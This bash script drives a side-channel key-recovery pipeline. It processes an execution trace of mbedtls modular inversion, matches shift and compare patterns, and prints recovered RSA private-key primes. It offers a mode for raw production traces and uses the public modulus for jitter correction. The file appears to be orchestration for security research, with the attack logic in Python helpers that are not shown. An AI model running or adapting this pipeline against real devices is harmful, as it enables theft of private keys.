#!/usr/bin/env bash
ROOT="$(realpath "$(dirname "$0")")"

PY_SCRIPTS=${ROOT}/scripts
INPUTS=${ROOT}/../traces/tfm-inv-mod-001
OUTPUTS=${ROOT}/outputs
PATTERNS=${ROOT}/patterns
TRACE=${INPUTS}/trace.txt  # Default trace file
TRACE_NUM=${OUTPUTS}/trace_num.txt
VERBOSITY=0  # Default verbosity level
RAW_MODE=0 # Set by -r/--raw
MODULUS="" # Optional public modulus N in hex for jitter correction
MODULUS_FROM="" # Optional file to read the modulus from
SHIFTS_PATTERN=${PATTERNS}/patterns-shifts-inv-mod.txt # debug-trace shift templates (debug is default default)
CMP_START=${PATTERNS}/pattern-cmp-inv-mod-start.txt
CMP_END=${PATTERNS}/pattern-cmp-inv-mod-end.txt
CMP_PATTERN=${PATTERNS}/patterns-cmp-inv-mod.txt

#-------------------------------------------------------------------------------
# Parse arguments
#-------------------------------------------------------------------------------
set -e

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t|--trace)
            if [[ -z "$2" ]]; then
                echo "Error: --trace requires a file path"
                exit 1
            fi
            TRACE="$2"
            shift 2
            ;;
        -v|--verbosity)
            if [[ -z "$2" ]] || ! [[ "$2" =~ ^[01]$ ]]; then
                echo "Error: --verbosity requires a value of 0 or 1"
                exit 1
            fi
            VERBOSITY="$2"
            shift 2
            ;;
        -r|--raw)
            SHIFTS_PATTERN=${PATTERNS}/patterns-shifts-inv-mod-raw.txt
            CMP_START=${PATTERNS}/pattern-cmp-inv-mod-start-raw.txt
            CMP_END=${PATTERNS}/pattern-cmp-inv-mod-end-raw.txt
            CMP_PATTERN=${PATTERNS}/patterns-cmp-inv-mod-raw.txt
            RAW_MODE=1
            shift
            ;;
        -n|--modulus)
            if [[ -z "$2" ]]; then
                echo "Error: --modulus requires a hex value"
                exit 1
            fi
            MODULUS="$2"
            shift 2
            ;;
        --modulus-from)
            if [[ -z "$2" ]]; then
                echo "Error: --modulus-from requires a file path"
                exit 1
            fi
            MODULUS_FROM="$2"
            shift 2
            ;;
        -h|--help)
            echo "Usage: $0 [-t|--trace TRACE_FILE] [-v|--verbosity LEVEL]"
            echo ""
            echo "Options:"
            echo "  -t, --trace TRACE_FILE    Specify trace file (default: ${INPUTS}/trace.txt)"
            echo "  -v, --verbosity LEVEL     Set verbosity level (0 or 1, default: 0)"
            echo "                           0: Show only final output"
            echo "                           1: Show all script outputs"
            echo "  -r, --raw                 Use shift templates for a"
            echo "                           production trace (MSTP_RAW_PRODUCTION_TRACE)."
            echo "                           attemps to adapt the raw templates if patterns differ"
            echo "  -n, --modulus HEX         publicRSA modulus N (hex). Verifies the"
            echo "                           recovered primes against N and auto-corrects"
            echo "                           single-step jitter errors"
            echo "  --modulus-from FILE       Read the PUBLIC modulus N from FILE (an"
            echo "                           'N = ...' line, or two prime lines)"
            echo "  -h, --help               Show this help message"
            echo ""
            echo "Examples:"
            echo "  $0                                    # Use defaults (verbosity 0)"
            echo "  $0 -v 1                              # Show all outputs"
            echo "  $0 -t /path/to/my_trace.txt -v 1     # Custom trace with full output"
            echo "  $0 --trace ./custom_trace.txt --verbosity 0  # Custom trace, quiet mode"
            echo "  $0 -r -t ./rsaRaw.txt                # Raw production trace"
            exit 0
            ;;
        *)
            echo "Unknown argument: $1"
            echo "Usage: $0 [-t|--trace TRACE_FILE] [-v|--verbosity LEVEL]"
            echo "Use -h or --help for more information"
            exit 1
            ;;
    esac
done

# Validate trace file exists
if [[ ! -f "$TRACE" ]]; then
    echo "Error: Trace '$TRACE' not found"
    exit 1
fi

echo "Processing trace file: $TRACE"

#-------------------------------------------------------------------------------
# raw mode, if no mosulus was supplied, it is used from the trace itself.
# if the header doesnt contain any keys to derive it from than it has to be given
# explicitly
#-------------------------------------------------------------------------------
if [[ $RAW_MODE -eq 1 && -z "$MODULUS" && -z "$MODULUS_FROM" ]]; then
    if grep -qiE '^[[:space:]]*(N|p|q)[[:space:]]*=[[:space:]]*(0x)?[0-9a-fA-F]+' "$TRACE"; then
        MODULUS_FROM="$TRACE"
        if [[ $VERBOSITY -eq 1 ]]; then
            echo "Raw mode: auto-using PUBLIC modulus from trace header ($TRACE)"
        fi
    fi
fi

#-------------------------------------------------------------------------------
# Add "time" info to the trace to be able to later be able to process the gathered
# patterns in the sequence the underlying operations they represent were executed.
#-------------------------------------------------------------------------------
if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 1: Adding time info to trace..."
fi

if [[ $VERBOSITY -eq 0 ]]; then
    python3 ${PY_SCRIPTS}/numerate-trace.py \
            --trace ${TRACE}                \
            --output ${TRACE_NUM} >/dev/null 2>&1
else
    python3 ${PY_SCRIPTS}/numerate-trace.py \
            --trace ${TRACE}                \
            --output ${TRACE_NUM}
fi

#-------------------------------------------------------------------------------
# raw mode, auto adapt templates, since the captures might differ on different builds
#-------------------------------------------------------------------------------
if [[ $RAW_MODE -eq 1 ]]; then
    ADAPTED=${OUTPUTS}/adapted-patterns
    mkdir -p "${ADAPTED}"
    if [[ $VERBOSITY -eq 0 ]]; then
        python3 ${PY_SCRIPTS}/adapt-patterns.py        \
                --trace ${TRACE}                       \
                --out-dir ${ADAPTED}                   \
                --ref-period 11                        \
                --patterns ${SHIFTS_PATTERN} ${CMP_START} ${CMP_END} ${CMP_PATTERN} \
                >/dev/null 2>&1
    else
        python3 ${PY_SCRIPTS}/adapt-patterns.py        \
                --trace ${TRACE}                       \
                --out-dir ${ADAPTED}                   \
                --ref-period 11                        \
                --patterns ${SHIFTS_PATTERN} ${CMP_START} ${CMP_END} ${CMP_PATTERN}
    fi
    SHIFTS_PATTERN=${ADAPTED}/$(basename ${SHIFTS_PATTERN})
    CMP_START=${ADAPTED}/$(basename ${CMP_START})
    CMP_END=${ADAPTED}/$(basename ${CMP_END})
    CMP_PATTERN=${ADAPTED}/$(basename ${CMP_PATTERN})
fi

#-------------------------------------------------------------------------------
# Get the shifts u and shift v patterns
#-------------------------------------------------------------------------------

# Check if patterns-list.txt exists and remove it if it does
if [[ -f "${OUTPUTS}/patterns-list.txt" ]]; then
    rm "${OUTPUTS}/patterns-list.txt"  || true
fi

if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 2: Getting shifts u and shift v patterns..."
fi

if [[ $VERBOSITY -eq 0 ]]; then
    python3 ${PY_SCRIPTS}/find-patterns.py                      \
            --trace ${TRACE_NUM}                                \
            --pattern ${SHIFTS_PATTERN}                           \
            --output ${OUTPUTS}                                 \
            --pattern-list                                      \
            --verbosity 0 >/dev/null 2>&1
else
    python3 ${PY_SCRIPTS}/find-patterns.py                      \
            --trace ${TRACE_NUM}                                \
            --pattern ${SHIFTS_PATTERN}                           \
            --output ${OUTPUTS}                                 \
            --pattern-list                                      \
            --verbosity 0   
fi

#-------------------------------------------------------------------------------
# Get the sub u and sub v patterns
#-------------------------------------------------------------------------------
if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 3: Searching for mbedtls_mpi_cmp_mpi function..."
fi

## Search for the mbedtls_mpi_cmp_mpi function
if [[ $VERBOSITY -eq 0 ]]; then
    python3 ${PY_SCRIPTS}/find-patterns.py                              \
            --trace ${TRACE_NUM}                                        \
            --pattern-start ${CMP_START}                                 \
            --pattern-end ${CMP_END}                                     \
            --output ${OUTPUTS}                                         \
            --verbosity 0 >/dev/null 2>&1
else
    python3 ${PY_SCRIPTS}/find-patterns.py                              \
            --trace ${TRACE_NUM}                                        \
            --pattern-start ${CMP_START}                                 \
            --pattern-end ${CMP_END}                                     \
            --output ${OUTPUTS}                                         \
            --verbosity 0
fi

if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 4: Getting sub u and sub v patterns..."
fi

## Get the sub u and sub v patterns 
if [[ $VERBOSITY -eq 0 ]]; then
    python3 ${PY_SCRIPTS}/find-patterns.py                                  \
            --trace ${OUTPUTS}/pattern-match-pattern-cmp-inv-mod-start.txt  \
            --pattern ${CMP_PATTERN}                                         \
            --output ${OUTPUTS}                                             \
            --pattern-list                                                  \
            --verbosity 0 >/dev/null 2>&1
else
    python3 ${PY_SCRIPTS}/find-patterns.py                                  \
            --trace ${OUTPUTS}/pattern-match-pattern-cmp-inv-mod-start.txt  \
            --pattern ${CMP_PATTERN}                                         \
            --output ${OUTPUTS}                                             \
            --pattern-list                                                  \
            --verbosity 0
fi

#-------------------------------------------------------------------------------
# Get the shifts u, shift v and subs vectors 
#-------------------------------------------------------------------------------
if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 5: Getting shifts u, shift v and subs vectors..."
fi

if [[ $VERBOSITY -eq 0 ]]; then
    python3 ${PY_SCRIPTS}/get-shifts-subs.py        \
            --pattern ${OUTPUTS}/patterns-list.txt \
            --input ${OUTPUTS}                      \
            --output ${OUTPUTS} >/dev/null 2>&1
else
    python3 ${PY_SCRIPTS}/get-shifts-subs.py        \
            --pattern ${OUTPUTS}/patterns-list.txt \
            --input ${OUTPUTS}                      \
            --output ${OUTPUTS}
fi

#-------------------------------------------------------------------------------
# Recover the private key
#-------------------------------------------------------------------------------
if [[ $VERBOSITY -eq 1 ]]; then
    echo "Step 6: Recovering private key..."
fi

echo ""
echo "Recovered private key prime numbers:"
echo ""

# The last script always shows output regardless of verbosity level
# (-n/--modulus and --modulus-from supply the public modulus for jitter correction)
RECOVER_ARGS=(--patterns ${OUTPUTS}/patterns-list-results.txt)
if [[ -n "$MODULUS" ]]; then
    RECOVER_ARGS+=(--modulus "${MODULUS}")
elif [[ -n "$MODULUS_FROM" ]]; then
    RECOVER_ARGS+=(--modulus-from "${MODULUS_FROM}")
fi
python3 ${PY_SCRIPTS}/recover-keys-inv-mod.py "${RECOVER_ARGS[@]}"